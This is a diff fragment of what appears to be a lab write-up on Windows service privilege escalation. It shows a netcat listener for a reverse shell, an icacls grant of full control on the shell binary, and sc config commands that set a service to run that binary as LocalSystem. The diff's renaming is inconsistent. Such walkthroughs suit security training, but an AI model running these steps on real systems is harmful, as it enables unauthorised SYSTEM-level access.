@@ -264,11 +264,11 @@ nc -lvp 4447
 ```
 [Victime]
 ```
-icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+icacls C:\Users\unpriv\rev-svc3.exe /grant Everyone:F
 ```
 
 ```
-sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+sc config MyService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 ```
 ```
 sc stop MyService
